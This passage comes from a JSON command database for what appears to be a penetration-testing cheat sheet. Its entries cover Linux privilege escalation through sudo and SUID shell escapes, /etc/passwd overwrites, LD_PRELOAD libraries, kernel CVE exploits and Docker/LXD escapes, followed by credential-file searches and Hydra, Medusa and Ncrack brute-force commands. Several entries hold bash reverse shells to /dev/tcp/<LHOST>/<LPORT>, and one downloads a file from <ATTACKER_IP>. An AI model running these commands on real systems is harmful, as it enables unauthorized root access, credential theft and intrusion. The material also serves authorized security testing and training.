            "cmd": "nmap --interactive\n!sh",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: nmap (versions 2.02-5.21)"
          },
          {
            "title": "SUID cp Overwrite Passwd",
            "desc": "Overwrite /etc/passwd via SUID cp",
            "cmds": [
              "openssl passwd -1 newpassword",
              "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /tmp/passwd",
              "cp /tmp/passwd /etc/passwd"
            ],
            "tags": [
              "advanced"
            ],
            "note": "GTFOBins: cp"
          },
          {
            "title": "SUID env Shell",
            "desc": "Escalate via SUID env",
            "cmd": "env /bin/sh -p",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Sudo Misconfigurations",
        "commands": [
          {
            "title": "List Sudo Privileges",
            "desc": "Show what current user can run as sudo",
            "cmd": "sudo -l",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo bash",
            "desc": "Direct root shell via sudo",
            "cmd": "sudo bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo vi/vim Shell",
            "desc": "Escape to shell from sudo vim",
            "cmd": "sudo vim -c ':!/bin/bash'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo find Exec",
            "desc": "Command execution via sudo find",
            "cmd": "sudo find / -exec /bin/bash \\; -quit",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo python Shell",
            "desc": "Root shell via sudo python",
            "cmd": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo perl Shell",
            "desc": "Root shell via sudo perl",
            "cmd": "sudo perl -e 'exec \"/bin/bash\";'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo awk Shell",
            "desc": "Root shell via sudo awk",
            "cmd": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo less Shell",
            "desc": "Shell escape from sudo less",
            "cmd": "sudo less /etc/passwd\n!/bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo more Shell",
            "desc": "Shell escape from sudo more",
            "cmd": "sudo more /etc/passwd\n!/bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo nmap Shell",
            "desc": "Root shell via sudo nmap",
            "cmd": "echo 'os.execute(\"/bin/bash\")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo tee Write Files",
            "desc": "Write to privileged files via sudo tee",
            "cmd": "echo 'root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo wget File Overwrite",
            "desc": "Overwrite files via sudo wget",
            "cmd": "sudo wget http://<ATTACKER_IP>/malicious_passwd -O /etc/passwd",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo cp File Overwrite",
            "desc": "Copy files as root via sudo cp",
            "cmd": "sudo cp /tmp/evil_shadow /etc/shadow",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo env Shell",
            "desc": "Root shell via sudo env",
            "cmd": "sudo env /bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo tar Shell",
            "desc": "Root shell via sudo tar",
            "cmd": "sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo zip Shell",
            "desc": "Root shell via sudo zip",
            "cmd": "sudo zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\"",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo git Shell",
            "desc": "Root shell via sudo git",
            "cmd": "sudo git -p help config\n!/bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LD_PRELOAD Escalation",
            "desc": "Abuse LD_PRELOAD in sudo configuration",
            "cmds": [
              "echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}' > /tmp/pe.c",
              "gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles",
              "sudo LD_PRELOAD=/tmp/pe.so <ALLOWED_COMMAND>"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Only works if env_keep contains LD_PRELOAD"
          },
          {
            "title": "LD_LIBRARY_PATH Escalation",
            "desc": "Abuse LD_LIBRARY_PATH in sudo configuration",
            "cmds": [
              "ldd <SUID_OR_SUDO_BINARY>",
              "# Create malicious shared library matching a linked .so",
              "gcc -fPIC -shared -o /tmp/libfoo.so /tmp/evil.c",
              "sudo LD_LIBRARY_PATH=/tmp <ALLOWED_COMMAND>"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "CVE-2021-3156 (Baron Samedit)",
            "desc": "Sudo heap overflow affecting versions < 1.9.5p2",
            "cmd": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
            "tags": [
              "advanced"
            ],
            "note": "Affects sudo versions 1.8.2-1.8.31p2, 1.9.0-1.9.5p1"
          },
          {
            "title": "Sudo CVE-2019-14287 (Run as -1)",
            "desc": "Bypass sudo runas restriction with UID -1",
            "cmd": "sudo -u#-1 /bin/bash",
            "tags": [
              "advanced"
            ],
            "note": "Works when sudoers has (ALL, !root) - sudo < 1.8.28"
          },
          {
            "title": "Sudo NOPASSWD Abuse",
            "desc": "Check for NOPASSWD entries in sudo -l",
            "cmd": "sudo -l 2>/dev/null | grep -i 'NOPASSWD'",
            "tags": [
              "essential"
            ],
            "note": "Any NOPASSWD entry is a potential escalation vector"
          },
          {
            "title": "Sudo apache2 Shell",
            "desc": "Root shell via sudo apache2",
            "cmd": "sudo apache2 -f /etc/shadow",
            "tags": [
              "tool"
            ],
            "note": "Leaks shadow file contents in error message"
          },
          {
            "title": "Sudo Node.js Shell",
            "desc": "Root shell via sudo node",
            "cmd": "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Sudo Docker Shell",
            "desc": "Root shell via sudo docker",
            "cmd": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo Mysql Shell",
            "desc": "Root shell via sudo mysql",
            "cmd": "sudo mysql -e '\\! /bin/bash'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Sudo SSH-Keygen Shell",
            "desc": "Read files via sudo ssh-keygen",
            "cmd": "sudo ssh-keygen -D ./lib.so",
            "tags": [
              "advanced"
            ],
            "note": "Create a malicious shared library"
          }
        ]
      },
      {
        "name": "Scheduled Task Exploitation",
        "commands": [
          {
            "title": "Enumerate Cron Jobs",
            "desc": "List all cron jobs for current user",
            "cmd": "crontab -l",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "System Cron Jobs",
            "desc": "Check system-wide cron jobs",
            "cmds": [
              "cat /etc/crontab",
              "ls -la /etc/cron.d/",
              "ls -la /etc/cron.daily/",
              "ls -la /etc/cron.hourly/"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find Writable Cron Scripts",
            "desc": "Find cron scripts that are world-writable",
            "cmd": "find /etc/cron* -writable -type f 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Monitor Cron with pspy",
            "desc": "Monitor process creation to find hidden cron jobs",
            "cmd": "./pspy64",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Upload pspy to target first"
          },
          {
            "title": "Tar Wildcard Injection",
            "desc": "Exploit tar with wildcard in cron job",
            "cmds": [
              "echo '' > '/path/to/cron/dir/--checkpoint=1'",
              "echo '' > '/path/to/cron/dir/--checkpoint-action=exec=sh shell.sh'",
              "echo '#!/bin/bash\\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /path/to/cron/dir/shell.sh"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Works when cron runs: tar czf backup.tar.gz *"
          },
          {
            "title": "PATH Variable Exploitation",
            "desc": "Exploit cron job that calls commands without full path",
            "cmds": [
              "echo '#!/bin/bash\\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /tmp/<COMMAND_NAME>",
              "chmod +x /tmp/<COMMAND_NAME>",
              "export PATH=/tmp:$PATH"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Works when cron PATH includes writable directory or cron script uses relative paths"
          },
          {
            "title": "Systemd Timer Enum",
            "desc": "List systemd timers",
            "cmd": "systemctl list-timers --all",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Linux Capabilities",
        "commands": [
          {
            "title": "List All Capabilities",
            "desc": "Find all binaries with capabilities set",
            "cmd": "getcap -r / 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "cap_setuid Python",
            "desc": "Escalate via python with cap_setuid",
            "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "cap_setuid Perl",
            "desc": "Escalate via perl with cap_setuid",
            "cmd": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "cap_dac_read_search",
            "desc": "Read any file on the system",
            "cmd": "# Binary with cap_dac_read_search can read any file\n# Example: tar with cap_dac_read_search\ntar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "cap_net_bind_service",
            "desc": "Bind to privileged ports (<1024)",
            "cmd": "# Binary with cap_net_bind_service can bind to any port\npython3 -c 'import socket;s=socket.socket();s.bind((\"0.0.0.0\",80));s.listen(1)'",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Writable Files & PATH Hijack",
        "commands": [
          {
            "title": "Writable /etc/passwd",
            "desc": "Add root user to writable passwd file",
            "cmds": [
              "openssl passwd -1 newpassword",
              "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd",
              "su root2"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "World-Writable Files",
            "desc": "Find world-writable files",
            "cmd": "find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "World-Writable Directories",
            "desc": "Find world-writable directories",
            "cmd": "find / -writable -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PATH Hijack via SUID Binary",
            "desc": "Hijack PATH for SUID binary using relative command path",
            "cmds": [
              "echo '#!/bin/bash\\n/bin/bash -p' > /tmp/service",
              "chmod +x /tmp/service",
              "export PATH=/tmp:$PATH",
              "<SUID_BINARY>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Only works if SUID binary calls commands without absolute path"
          },
          {
            "title": "Shared Library Hijack",
            "desc": "Find shared library misconfigurations",
            "cmds": [
              "# Find SUID binary and check libraries",
              "ldd <SUID_BINARY>",
              "# Check for writable library directories in search path",
              "strace <SUID_BINARY> 2>&1 | grep -i 'open.*\\.so'"
            ],
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Kernel Exploits",
        "commands": [
          {
            "title": "Linux Exploit Suggester",
            "desc": "Suggest kernel exploits based on kernel version",
            "cmd": "perl linux-exploit-suggester.pl",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Linux Exploit Suggester 2",
            "desc": "Alternative exploit suggester (Python)",
            "cmd": "python linux-exploit-suggester-2.py",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "DirtyPipe (CVE-2022-0847)",
            "desc": "Kernel exploit for Linux 5.8-5.16.11",
            "cmd": "./dirtypipe /etc/passwd 1 '${root_entry}'",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel 5.8 through 5.16.11, 5.15.25, 5.10.102"
          },
          {
            "title": "DirtyCow (CVE-2016-5195)",
            "desc": "Kernel exploit for race condition in memory management",
            "cmd": "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty newpassword",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel < 4.8.3"
          },
          {
            "title": "PwnKit (CVE-2021-4034)",
            "desc": "Polkit pkexec local privilege escalation",
            "cmd": "gcc pwnkit.c -o pwnkit && ./pwnkit",
            "tags": [
              "advanced"
            ],
            "note": "Affects most Linux distros with polkit installed (2009-2022)"
          },
          {
            "title": "Check Kernel Version for Exploits",
            "desc": "Quick kernel version identification",
            "cmd": "uname -r",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CVE-2022-2588 (DirtyCred)",
            "desc": "Kernel exploit using credential swapping",
            "cmd": "gcc dirtycred.c -o dirtycred && ./dirtycred",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel >= 5.8"
          },
          {
            "title": "CVE-2023-0386 (OverlayFS)",
            "desc": "OverlayFS privilege escalation",
            "cmd": "gcc exploit.c -o exploit && ./exploit",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel < 6.2"
          },
          {
            "title": "CVE-2023-32233 (Netfilter)",
            "desc": "Netfilter nf_tables use-after-free",
            "cmd": "gcc netfilter_exploit.c -o nf_exploit -lnftnl -lmnl && ./nf_exploit",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel 5.1 to 6.3.1"
          },
          {
            "title": "Check Sudo Version for CVEs",
            "desc": "Check sudo version for known vulnerabilities",
            "cmd": "sudo --version",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check Polkit Version",
            "desc": "Check for PwnKit vulnerability",
            "cmd": "pkexec --version",
            "tags": [
              "essential"
            ],
            "note": "Versions before 0.120 are vulnerable to CVE-2021-4034"
          },
          {
            "title": "PwnKit CVE-2021-4034",
            "desc": "pkexec local privesc",
            "cmds": [
              "ls -la /usr/bin/pkexec",
              "gcc pwnkit.c -o pwnkit && ./pwnkit"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Sudo CVE-2019-14287",
            "desc": "Bypass sudo user restriction",
            "cmd": "sudo -u#-1 /bin/bash",
            "tags": [
              "essential"
            ],
            "note": "Works on sudo < 1.8.28 with (ALL, !root) config"
          }
        ]
      },
      {
        "name": "Docker & Container Escape",
        "commands": [
          {
            "title": "Check Docker Group",
            "desc": "Check if current user is in docker group",
            "cmd": "id | grep -i docker",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Docker Group Escape (Mount Host)",
            "desc": "Mount host filesystem to escape container",
            "cmd": "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Docker Socket Escape",
            "desc": "Escape via exposed Docker socket",
            "cmd": "docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LXD Group Escape",
            "desc": "Exploit lxd group membership for root",
            "cmds": [
              "lxc image import alpine.tar.gz --alias alpine",
              "lxc init alpine privesc -c security.privileged=true",
              "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
              "lxc start privesc",
              "lxc exec privesc /bin/sh"
            ],
            "tags": [
              "essential"
            ],
            "note": "Need to upload alpine image to target first"
          },
          {
            "title": "Check Container Environment",
            "desc": "Determine if running inside a container",
            "cmds": [
              "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
              "ls -la /.dockerenv 2>/dev/null",
              "hostname"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Privileged Container Escape",
            "desc": "Escape from privileged Docker container",
            "cmds": [
              "mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape",
              "echo 1 > /tmp/escape/notify_on_release",
              "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
              "echo \"$host_path/cmd\" > /tmp/escape/release_agent",
              "echo '#!/bin/bash' > /cmd",
              "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /cmd",
              "chmod +x /cmd",
              "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Docker Group Escape (Named Image)",
            "desc": "Escape via docker group with specific image",
            "cmd": "docker run -it --rm -v /:/mnt alpine chroot /mnt bash",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Docker Writable Socket Check",
            "desc": "Check if Docker socket is writable",
            "cmd": "ls -la /var/run/docker.sock",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LXD Group Escape (Quick)",
            "desc": "Quick LXD escape if already initialized",
            "cmds": [
              "lxc init ubuntu:20.04 privesc -c security.privileged=true",
              "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
              "lxc start privesc",
              "lxc exec privesc -- /bin/bash"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LXD Import Alpine Image",
            "desc": "Download and import Alpine image for LXD escape",
            "cmds": [
              "# On attacker: download alpine lxd image from https://github.com/saghul/lxd-alpine-builder",
              "# Transfer to target",
              "lxc image import alpine-v3.13-x86_64.tar.gz --alias alpine"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check Group Memberships",
            "desc": "Check if user belongs to docker, lxd, or disk groups",
            "cmd": "id | grep -oP '\\(docker\\)|\\(lxd\\)|\\(disk\\)|\\(adm\\)'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Disk Group Abuse",
            "desc": "Read raw filesystem if in disk group",
            "cmd": "debugfs /dev/sda1 -R 'cat /etc/shadow'",
            "tags": [
              "advanced"
            ],
            "note": "Disk group allows raw access to block devices"
          },
          {
            "title": "ADM Group Log Access",
            "desc": "Read sensitive logs if in adm group",
            "cmd": "find /var/log -readable -type f 2>/dev/null | xargs grep -li 'password\\|pass\\|credential' 2>/dev/null",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Docker Group Mount Host",
            "desc": "Escape via Docker group",
            "cmds": [
              "docker run -v /:/host -it alpine chroot /host /bin/bash",
              "docker run -v /etc/shadow:/shadow -it alpine cat /shadow"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "NFS Abuse",
        "commands": [
          {
            "title": "Check NFS Exports",
            "desc": "View NFS shares from remote",
            "cmd": "showmount -e <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check no_root_squash",
            "desc": "Identify NFS shares with no_root_squash",
            "cmd": "cat /etc/exports",
            "tags": [
              "essential"
            ],
            "note": "no_root_squash allows root on client to be root on NFS share"
          },
          {
            "title": "Mount NFS Share",
            "desc": "Mount NFS share on attacker machine",
            "cmd": "mkdir /tmp/nfs && mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NFS SUID Shell Exploit",
            "desc": "Create SUID binary on NFS share as root",
            "cmds": [
              "# On attacker (as root) after mounting NFS share:",
              "cp /bin/bash /tmp/nfs/suid_bash",
              "chmod u+s /tmp/nfs/suid_bash",
              "# On target:",
              "/path/to/nfs/suid_bash -p"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Automated Scanners",
        "commands": [
          {
            "title": "LinPEAS",
            "desc": "Comprehensive Linux privilege escalation scanner",
            "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "LinPEAS (Uploaded)",
            "desc": "Run LinPEAS after uploading to target",
            "cmd": "chmod +x linpeas.sh && ./linpeas.sh -a",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "LinEnum",
            "desc": "Linux enumeration and privilege escalation script",
            "cmd": "chmod +x LinEnum.sh && ./LinEnum.sh -t",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Pspy Process Monitor",
            "desc": "Monitor processes without root privileges",
            "cmd": "./pspy64",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Excellent for finding cron jobs and hidden processes"
          },
          {
            "title": "Linux Smart Enumeration",
            "desc": "Smart Linux enumeration tool",
            "cmd": "chmod +x lse.sh && ./lse.sh -l 2",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "LinPEAS Specific Checks",
            "desc": "Run LinPEAS with specific check categories",
            "cmd": "./linpeas.sh -a -s -e",
            "tags": [
              "tool"
            ],
            "note": "-a=all, -s=superfast, -e=extra checks"
          },
          {
            "title": "LinPrivChecker",
            "desc": "Linux privilege checker script",
            "cmd": "python linprivchecker.py -w linprivchecker_output.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SUITECase Priv Checker",
            "desc": "Simple Unix privilege escalation checker",
            "cmd": "bash unix-privesc-check standard",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "GTFOBins Lookup",
            "desc": "Manual lookup for binary exploitation",
            "cmd": "# Visit https://gtfobins.github.io/ and search for the SUID/sudo binary",
            "tags": [
              "essential"
            ],
            "note": "Always check GTFOBins for any unusual SUID binary or sudo permission"
          }
        ]
      },
      {
        "name": "Interesting Files & Configs",
        "commands": [
          {
            "title": "Find History Files",
            "desc": "Search command histories",
            "cmd": "find / -name '.*history' -o -name '.*_history' 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Keys Search",
            "desc": "Find SSH private keys",
            "cmd": "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Web App Configs",
            "desc": "Find configs with passwords",
            "cmds": [
              "find / -name 'wp-config.php' -o -name 'config.php' -o -name '.env' -o -name 'database.yml' -o -name 'settings.py' 2>/dev/null",
              "grep -rli 'password\\|passwd\\|db_pass\\|secret_key' /var/www/ /opt/ /srv/ 2>/dev/null"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find Database Files",
            "desc": "Search for DB files",
            "cmd": "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Find Backups",
            "desc": "Find backup files",
            "cmd": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' -o -name '*.orig' 2>/dev/null | head -30",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Check /opt /srv",
            "desc": "Custom apps with creds",
            "cmd": "ls -laR /opt/ /srv/ 2>/dev/null | head -50",
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "password-ops",
    "name": "Credential Attacks & Hash Cracking",
    "icon": "🔑",
    "description": "Perform online brute force, offline hash cracking, credential dumping, and password spraying to compromise authentication mechanisms.",
    "subcategories": [
      {
        "name": "Online Brute Force",
        "commands": [
          {
            "title": "Hydra SSH Brute Force",
            "desc": "Brute force SSH login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hydra FTP Brute Force",
            "desc": "Brute force FTP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hydra HTTP POST Form",
            "desc": "Brute force web login form (POST)",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Adjust form fields and failure string to match target"
          },
          {
            "title": "Hydra HTTP GET Basic Auth",
            "desc": "Brute force HTTP Basic Authentication",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected/",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Hydra RDP Brute Force",
            "desc": "Brute force RDP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra SMB Brute Force",
            "desc": "Brute force SMB login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra MySQL Brute Force",
            "desc": "Brute force MySQL login",
            "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra MSSQL Brute Force",
            "desc": "Brute force MSSQL login",
            "cmd": "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra POP3 Brute Force",
            "desc": "Brute force POP3 login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra IMAP Brute Force",
            "desc": "Brute force IMAP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt imap://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra SMTP Brute Force",
            "desc": "Brute force SMTP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smtp://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra VNC Brute Force",
            "desc": "Brute force VNC login",
            "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra Telnet Brute Force",
            "desc": "Brute force Telnet login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt telnet://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra with User List",
            "desc": "Brute force with username and password lists",
            "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Medusa SSH Brute Force",
            "desc": "Medusa parallel brute forcer for SSH",
            "cmd": "medusa -h <TARGET_IP> -u <USER> -P /usr/share/wordlists/rockyou.txt -M ssh",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ncrack RDP Brute Force",
            "desc": "Ncrack brute forcer for RDP",
            "cmd": "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ncrack SSH Brute Force",
            "desc": "Ncrack brute forcer for SSH",
            "cmd": "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ncrack FTP Brute Force",
            "desc": "Ncrack brute forcer for FTP",
            "cmd": "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra SNMP Community Brute",
            "desc": "Brute force SNMP community strings",
            "cmd": "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP> snmp",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra HTTP POST JSON",
            "desc": "Brute force JSON API login endpoint",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=invalid:H=Content-Type: application/json'",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Hydra Multiple Targets",
            "desc": "Brute force across multiple targets",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -M targets.txt ssh -t 4",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Patator SSH Brute Force",
            "desc": "Parallel brute force with patator",
            "cmd": "patator ssh_login host=<TARGET_IP> user=<USER> password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Patator HTTP POST Brute Force",
            "desc": "Brute force web login with patator",
            "cmd": "patator http_fuzz url='http://<TARGET_IP>/login' method=POST body='user=^USER^&pass=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Crowbar RDP Brute Force",
            "desc": "Brute force RDP with crowbar",
            "cmd": "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Crowbar SSH Key Spray",
            "desc": "Spray SSH keys against a target",
            "cmd": "crowbar -b sshkey -s <TARGET_IP>/32 -u <USER> -k /path/to/keys/",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra MySQL",
            "desc": "Brute force MySQL",
            "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra MSSQL",
            "desc": "Brute force MSSQL",
            "cmd": "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra VNC",
            "desc": "Brute force VNC",
            "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra POP3",
            "desc": "Brute force POP3",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hydra IMAP",
            "desc": "Brute force IMAP",
